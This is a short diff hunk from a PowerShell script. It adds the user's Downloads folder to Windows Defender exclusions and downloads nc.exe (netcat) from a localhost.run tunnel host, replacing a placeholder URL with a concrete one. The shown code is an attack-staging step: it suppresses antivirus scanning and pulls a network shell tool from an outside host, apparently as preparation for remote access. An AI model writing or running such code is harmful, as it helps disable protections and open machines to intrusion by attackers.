@@ -13,7 +13,7 @@ try {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 
     # === Download nc.exe from localhost.run ===
-    $ncUrl = "http://your-subdomain.lhr.life/nc.exe"  # Replace with your actual localhost.run URL
+    $ncUrl = "https://03ce78442ce484.lhr.life/nc.exe"  # Replace with your actual localhost.run URL
     $ncPath = "$env:USERPROFILE\Downloads\nc.exe"
 
     Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
